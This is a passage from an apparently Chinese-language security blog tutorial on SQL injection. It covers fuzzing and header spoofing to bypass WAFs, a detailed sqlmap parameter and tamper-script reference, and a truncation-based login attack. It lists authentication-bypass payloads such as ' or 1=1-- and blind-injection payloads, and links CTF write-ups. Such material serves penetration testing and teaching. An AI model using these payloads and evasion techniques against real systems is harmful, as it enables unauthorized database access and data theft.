<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">使用脚本去探测WAF设备对于字符处理是否有异常，上面已经说过WAF在接收到网络数据之后会做相应的数据包解析，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass。 我测试的时候常常测试的位置：</span><br><span class="line"></span><br><span class="line">1）：get请求处</span><br><span class="line">2）：header请求处</span><br><span class="line">3）：post urlencode内容处</span><br><span class="line">4）：post form-data内容处</span><br><span class="line">然后模糊测试的基础内容有：</span><br><span class="line"></span><br><span class="line">1）编码过的0-255字符</span><br><span class="line">2）进行编码的0-255字符</span><br><span class="line">3）utf gbk字符</span><br><span class="line">实例1：http://wooyun.org/bugs/wooyun-2010-087545</span><br><span class="line"></span><br><span class="line">在一次测试安全狗的过程中，使用post的方式提交数据，提交数据包括两个参数，一个是正常的fuzz点，另一个参数包含一个sql注入语句。当在测试前面的fuzz点的时候，处理到\x00的字符的时候，没有提示安全狗阻拦。应该是解析这个字符的时候不当，导致了bypass。</span><br><span class="line"></span><br><span class="line">实例2：http://wooyun.org/bugs/wooyun-2015-091516</span><br><span class="line"></span><br><span class="line">在一次测试云WAF中，使用get方式提交数据，提交内容包括一个参数，参数为字符+sql注入的语句。当在fuzz字符的时候，发现云waf在处理到&amp;字符的时候，没有提示云waf阻拦。由于&amp;字符的特殊性，猜测是由于和url请求中的&amp;没有处理好导致的。由于mysql中&amp;&amp;同样可以表示and，因此拼凑一下sql语句就达到了bypass的目的。</span><br><span class="line"></span><br><span class="line">Ps.上面做模糊测试的时候仅仅是测试了一些各个位置的单个字符，应该还会有更复杂的测试，WAF并没想象的那么完美，肯定还可以fuzz出其他地方的问题。</span><br></pre></td></tr></table></figure>

<h4 id="白名单bypass"><a href="#白名单bypass" class="headerlink" title="白名单bypass"></a>白名单bypass</h4><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass1.jpg" alt="white-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WAF在设计之初一般都会考虑白名单功能。如来自管理IP的访问，来自cdn服务器的访问等等。这些请求是可信任的，不必走WAF检测流程。</span><br><span class="line"></span><br><span class="line">获取白名单的ip地址如果是从网络层获取的ip，这种一般bypass不了，如果采用应用层的数据作为白名单，这样就可能造成bypass。</span><br><span class="line"></span><br><span class="line">之前有一篇文章： http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366#.VGmhx9Yi5Mu</span><br><span class="line"></span><br><span class="line">文章内容是通过修改http的header来bypass waf，这里我们截取文章中部分内容：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass2.jpg" alt="white-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些header常常用来获取IP，可能还有其他的，例如nginx-lua-waf:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass3.jpg" alt="white-bypass3"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取clientip使用了X-Real-ip的header。</span><br><span class="line"></span><br><span class="line">此种方法还可以用来绕过如登陆锁ip，登陆多次验证码，后台验证等等的场景。</span><br></pre></td></tr></table></figure>

<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">特性就像是一个个特定的场景一样，一些是已经被研究人员发现的，一些是还没被发现，等待被研究人员发现的。</span><br><span class="line">随着一个个特性的发现，WAF的防护能力在web对抗中逐渐增强，在我看来，当所有的特性场景均被WAF考虑到的时候，势必就会有的新的发现。（如我们现在了解的mysql的场景）</span><br><span class="line">因此我们不用担心当所有的特性被WAF考虑到的时候我们无计可施，未知的特性那么多，我们还有很多地方可以去挖掘。</span><br><span class="line">当你发现这些姿势都不好使的时候，你就该去发现一些新的特性了，毕竟设计WAF的选手都是基于目前的认知下去设计的，当新的特性出现的时候，势必又是一波bypass。</span><br></pre></td></tr></table></figure>

<h1 id="自动化注入技术"><a href="#自动化注入技术" class="headerlink" title="自动化注入技术"></a>自动化注入技术</h1><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">sqlmap支持五种不同的注入模式：</span><br><span class="line">参数：--technique</span><br><span class="line">1、Boolean-based blind，基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</span><br><span class="line">2、Time-based blind，基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line">3、Error-based，基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line">4、UNION query，联合查询注入，可以使用union的情况下的注入。</span><br><span class="line">5、Stacked queries，堆查询注入，可以同时执行多条语句的执行时的注入。</span><br><span class="line"></span><br><span class="line">sqlmap支持的数据库有：</span><br><span class="line">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line">-u</span><br><span class="line">-r</span><br><span class="line">--random-agent</span><br><span class="line">--delay</span><br><span class="line">--no-cast或者--hex  跑columns需要字典，使用参数解决</span><br><span class="line"></span><br><span class="line">不常用参数:</span><br><span class="line">参数拆分字符</span><br><span class="line">参数：--param-del</span><br><span class="line">当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</span><br><span class="line"></span><br><span class="line">HTTP认证保护</span><br><span class="line">参数：--auth-type,--auth-cred</span><br><span class="line">这些参数可以用来登陆HTTP的认证保护支持三种方式：</span><br><span class="line">1、Basic</span><br><span class="line">2、Digest</span><br><span class="line">3、NTLM</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span><br><span class="line"></span><br><span class="line">HTTP协议的证书认证</span><br><span class="line">参数：--auth-cert</span><br><span class="line">当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。</span><br><span class="line">key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</span><br><span class="line"></span><br><span class="line">HTTP(S)代理</span><br><span class="line">参数：--proxy,--proxy-cred和--ignore-proxy</span><br><span class="line">使用--proxy代理是格式为：http://url:port。</span><br><span class="line">当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。</span><br><span class="line">--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</span><br><span class="line"></span><br><span class="line">HTTP请求延迟</span><br><span class="line">参数：--delay</span><br><span class="line">可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</span><br><span class="line"></span><br><span class="line">设定超时时间</span><br><span class="line">参数：--timeout</span><br><span class="line">可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</span><br><span class="line"></span><br><span class="line">设定延迟注入的时间</span><br><span class="line">参数：--time-sec</span><br><span class="line">当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。</span><br><span class="line"></span><br><span class="line">设定重试超时</span><br><span class="line">参数：--retries</span><br><span class="line">当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</span><br><span class="line"></span><br><span class="line">设定随机改变的参数值</span><br><span class="line">参数：--randomize</span><br><span class="line">可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</span><br><span class="line"></span><br><span class="line">利用正则过滤目标网址</span><br><span class="line">参数：--scope</span><br><span class="line">例如：</span><br><span class="line">python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</span><br><span class="line"></span><br><span class="line">避免过多的错误请求被屏蔽</span><br><span class="line">参数：--safe-url,--safe-freq</span><br><span class="line">有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</span><br><span class="line">绕过这个策略有两种方式：</span><br><span class="line">1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</span><br><span class="line">2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</span><br><span class="line"></span><br><span class="line">关掉URL参数值编码</span><br><span class="line">参数：--skip-urlencode</span><br><span class="line">根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。</span><br><span class="line"></span><br><span class="line">每次请求时候执行自定义的python代码</span><br><span class="line">参数：--eval</span><br><span class="line">在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br><span class="line"></span><br><span class="line">参数：--prefix,--suffix</span><br><span class="line">在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</span><br><span class="line">例如，代码中是这样调用数据库的：</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</span><br><span class="line">这时你就需要--prefix和--suffix参数了：</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br><span class="line">这样执行的SQL语句变成：</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;</span><br><span class="line"></span><br><span class="line">页面比较</span><br><span class="line">参数：--string,--not-string,--regexp,--code</span><br><span class="line">默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。</span><br><span class="line">参数：--text-only,--titles</span><br><span class="line">有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。</span><br><span class="line"></span><br><span class="line">设定UNION查询字段数</span><br><span class="line">参数：--union-cols</span><br><span class="line">默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</span><br><span class="line"></span><br><span class="line">二阶SQL注入</span><br><span class="line">参数：--second-order</span><br><span class="line">有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。</span><br><span class="line"></span><br><span class="line">sqlmap risk level指数</span><br><span class="line">参数：–risk 1(1,2,3)</span><br><span class="line">共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</span><br><span class="line">在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</span><br><span class="line">参数：–level 1(2,3,4,5)</span><br><span class="line">共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</span><br><span class="line">这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</span><br><span class="line">总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</span><br><span class="line"></span><br><span class="line">参数：-p,--skip</span><br><span class="line">sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</span><br><span class="line">当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。</span><br><span class="line">例如：--skip=&quot;user-angent.referer&quot;</span><br><span class="line">在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</span><br><span class="line"></span><br><span class="line">直接利用谷歌寻找网站的注入点</span><br><span class="line">参数：-g</span><br><span class="line">sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br><span class="line"></span><br><span class="line">用于表单注入</span><br><span class="line">参数：–data</span><br><span class="line">此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</span><br><span class="line"></span><br><span class="line">自动选择选择</span><br><span class="line">--answers=ANSWERS   Set question answers (e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line"></span><br><span class="line">显示等级</span><br><span class="line">参数：-v</span><br><span class="line">显示sqlmap对一个点是进行了怎样的尝试判断以及读取数据的</span><br><span class="line">共有七个等级，默认为1：</span><br><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>

<h2 id="使用tamper绕过waf"><a href="#使用tamper绕过waf" class="headerlink" title="使用tamper绕过waf"></a>使用tamper绕过waf</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">tamper用法</span><br><span class="line">python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --tamper=apostrophemask</span><br><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用&quot;NOT BETWEEN 0 AND #&quot;替换大于号&quot;&gt;&quot;，&quot;BETWEEN # AND #&quot;替换等于号&quot;=&quot;</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用&quot;LIKE&quot;替换等于号&quot;=&quot;</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用&quot;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&quot;替换像&quot;CONCAT(A, B)&quot;的实例</span><br><span class="line">equaltolike.py 用&quot;LIKE&quot;运算符替换全部等于号&quot;=&quot;</span><br><span class="line">greatest.py 用&quot;GREATEST&quot;函数替换大于号&quot;&gt;&quot;</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用&quot;IF(ISNULL(A), B, A)&quot;替换像&quot;IFNULL(A, B)&quot;的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加&quot;sp_password&quot; for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用&quot;/**/&quot;替换空格符</span><br><span class="line">space2dash.py 用破折号注释符&quot;–&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符&quot;#&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符&quot;#&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符&quot;#&quot;其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符&quot;–&quot;其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号&quot;+&quot;替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用&quot;UNION SELECT&quot;替换&quot;UNION ALL SELECT&quot;</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头&quot;X-originating-IP&quot;来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头&quot;X-Forwarded-For&quot;来绕过WAF</span><br><span class="line"></span><br><span class="line">其他技巧：</span><br><span class="line">xff注入：</span><br><span class="line">伪造ip地址，当被记录到数据库中时，可能造成注入，在header中加入X-Forwarded-For然后将请求保存为xxx.txt，使用sqlmap -r &quot;xxx.txt&quot; --level 5</span><br><span class="line">从数据库服务器中读取文件 参数：--file-read</span><br><span class="line">把文件上传到数据库服务器中 参数：--file-write,--file-dest</span><br><span class="line">爬行网站URL 参数：--crawl</span><br><span class="line">非交互模式 参数：--batch</span><br><span class="line">测试WAF/IPS/IDS保护 参数：--identify-waf</span><br><span class="line">启发式判断注入 参数：--smart（有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。）</span><br></pre></td></tr></table></figure>

<h1 id="其他注入技术"><a href="#其他注入技术" class="headerlink" title="其他注入技术"></a>其他注入技术</h1><h2 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">也就是二次注入的原理</span><br><span class="line">因为sql的select是不忽视最大长度的限制的</span><br><span class="line">而insert是有最大长度的限制的，超过长度限制就会发生截断。</span><br><span class="line">所以可以利用insert插入一个任意用户名加（N个空格，一般64个）然后用select选择出来</span><br><span class="line">select默认是选择第一条数据，所以存在一个任意用户登录的漏洞</span><br></pre></td></tr></table></figure>

<h2 id="万能密码（内联注入）"><a href="#万能密码（内联注入）" class="headerlink" title="万能密码（内联注入）"></a>万能密码（内联注入）</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/*</span><br><span class="line">or &#x27;=&#x27; or</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1--</span><br><span class="line"></span><br><span class="line">实战例子：</span><br><span class="line">select * from users where name=&#x27;.username.&#x27; and pass=&#x27;.password.&#x27;;</span><br><span class="line">在mysql查询语句中转义字符不参与闭合，当username=&#x27;\&#x27;时，sql语句变成了：</span><br><span class="line">select * from users where name=&#x27;\&#x27; and pass=&#x27;&#x27;;</span><br><span class="line">完成了闭合</span><br><span class="line">再使pass=or 1=1#即可绕过</span><br></pre></td></tr></table></figure>

<h1 id="后续扩展"><a href="#后续扩展" class="headerlink" title="后续扩展"></a>后续扩展</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. 需要：查询A union 查询B 后，返回查询B内容</span><br><span class="line"></span><br><span class="line">2. select * from tab_name where id=1 or(列名)</span><br><span class="line">其实是遍历字段名中的每个值然后选取那些不为false的内容</span><br><span class="line">因为在mysql中&#x27;ssdd&#x27;字符串默认等于0等于false所以不显示</span><br><span class="line">而&#x27;4ddf&#x27;这样的字符串默认等于4，也就是true也就会返回了</span><br><span class="line"></span><br><span class="line">3. 无回显位，select * from test1 where id=&#x27;$_GET[id]&#x27;;使用payload：if(substr(flag,1,1)in(0x41),1,0)</span><br><span class="line"></span><br><span class="line">4. Dnslog在SQL注入中的实战</span><br><span class="line">https://www.anquanke.com/post/id/98096</span><br><span class="line"></span><br><span class="line">5. 各种延时注入：</span><br><span class="line">https://www.cnblogs.com/cyjaysun/p/4463979.html</span><br></pre></td></tr></table></figure>

<h2 id="ctf注入相关wp"><a href="#ctf注入相关wp" class="headerlink" title="ctf注入相关wp"></a>ctf注入相关wp</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://www.th1s.cn/index.php/2017/11/05/147.html</span><br><span class="line"></span><br><span class="line">条件竞争注入：</span><br><span class="line">http://www.pang0lin.com/?p=822</span><br><span class="line"></span><br><span class="line">http://www.sdnisc.cn/detail_285_286_719.html</span><br><span class="line"></span><br><span class="line">lctf:</span><br><span class="line">https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/</span><br></pre></td></tr></table></figure>

<h2 id="新出现的waf绕过技术汇总"><a href="#新出现的waf绕过技术汇总" class="headerlink" title="新出现的waf绕过技术汇总"></a>新出现的waf绕过技术汇总</h2><h3 id="2017-10-19Bypass-D盾-IIS防火墙SQL注入防御"><a href="#2017-10-19Bypass-D盾-IIS防火墙SQL注入防御" class="headerlink" title="2017-10-19Bypass D盾_IIS防火墙SQL注入防御"></a>2017-10-19Bypass D盾_IIS防火墙SQL注入防御</h3><h4 id="IIS-PHP-MYSQL"><a href="#IIS-PHP-MYSQL" class="headerlink" title="IIS+PHP+MYSQL"></a>IIS+PHP+MYSQL</h4><h5 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h5><p>PHP中的PATH_INFO问题，以下两个url等价</p>
